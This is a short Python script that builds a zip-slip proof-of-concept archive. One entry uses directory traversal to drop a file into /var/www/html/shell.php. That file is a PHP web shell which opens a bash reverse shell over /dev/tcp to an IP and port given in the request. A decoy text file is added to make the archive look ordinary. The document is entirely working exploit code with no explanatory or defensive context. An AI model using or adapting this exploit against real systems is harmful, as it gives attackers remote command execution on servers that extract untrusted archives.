#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr("../../../../../var/www/html/shell.php", "<?php $ip=$_GET['ip']; $port=$_GET['port']; $payload = \"/bin/bash -c 'bash -i >& /dev/tcp/\".$ip.\"/\".$port.\" 0>&1'\"; exec($payload); ?>")
    z.writestr('anotherfilename.txt', 'content of another file')
    z.close()
    zip = open('poc.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()

